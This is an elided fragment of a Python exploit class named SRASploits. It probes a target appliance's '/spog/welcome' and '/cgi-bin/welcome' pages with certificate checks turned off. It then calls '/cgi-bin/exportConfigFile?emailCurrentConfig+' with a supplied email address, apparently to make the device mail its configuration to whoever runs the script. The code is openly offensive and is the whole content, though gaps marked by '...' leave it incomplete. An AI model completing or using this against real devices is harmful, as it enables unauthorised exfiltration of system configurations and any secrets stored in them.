...
class SRASploits():
    ...
    def Verify(self):
        ...
        try:
            s = requests.Session()
            s.mount('http://', HTTPAdapter(max_retries=max_retr))
            s.mount('https://', HTTPAdapter(max_retries=max_retr))
            tr = s.get(self.url + '/spog/welcome',
        ...
        if tr.status_code == 200:
            ...
            s.mount('http://', HTTPAdapter(max_retries=max_retr))
            s.mount('https://', HTTPAdapter(max_retries=max_retr))
            tr = s.get(self.url + '/cgi-bin/welcome',
                              verify=False, allow_redirects=False, headers=headers, proxies=proxies, timeout=10)
    ...
    def TryEmail(self):
        ...
        if self.Cookies is None:
            ...
            emr = s.get(self.url + '/cgi-bin/exportConfigFile?emailCurrentConfig+' + self.email, verify=False,
